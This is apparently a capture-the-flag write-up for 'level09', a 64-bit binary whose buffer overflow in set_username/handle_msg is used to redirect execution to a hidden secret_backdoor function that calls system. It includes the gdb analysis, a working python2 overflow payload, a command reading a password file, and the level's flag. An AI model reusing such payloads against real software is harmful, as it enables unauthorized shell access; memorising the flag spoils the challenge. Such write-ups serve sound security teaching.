# Level 09 — overflow into a pointer to reach a hidden backdoor

## Overview
A 64-bit binary that stores a username and handles messages. Reversing reveals
a hidden `secret_backdoor` function that calls `system`. A buffer overflow lets
us overwrite a control value/pointer so execution reaches that backdoor.

## Analysis
```sh
gdb ./level09
(gdb) info functions
(gdb) set disassembly-flavor intel
(gdb) disassemble main
(gdb) disassemble handle_msg
(gdb) disassemble secret_backdoor
```
`secret_backdoor` is never called on any normal path but invokes `system`.
Its address:
```
(gdb) break main
(gdb) run
(gdb) print secret_backdoor
0x55555555488c <secret_backdoor>
```

## Exploitation
`set_username` / `handle_msg` copy more bytes than their buffers hold. The
first write overflows the username field and adjusts a length/index byte
(`0xd0`); the second write then overflows far enough (`0xc8` padding) to drop
the 8-byte address of `secret_backdoor` onto the hijacked control slot:
```sh
cat <(python2 -c 'import sys; sys.stdout.write(
    "a"*0x28 + "\xd0" + "\n" +
    "a"*0xc8 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n")') - | ./level09
```
`\x8c\x48\x55\x55\x55\x55\x00\x00` is `0x55555555488c` in little-endian. `cat`
keeps stdin open for the resulting shell.

## Result
```sh
cat /home/users/end/.pass
```

## Files
- `steps_level09.txt` — command walkthrough.
- `main_disas.png`, `handle_message_disas.png`, `set_username_disas.png` —
  disassembly screenshots used during analysis.

## Flag
```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
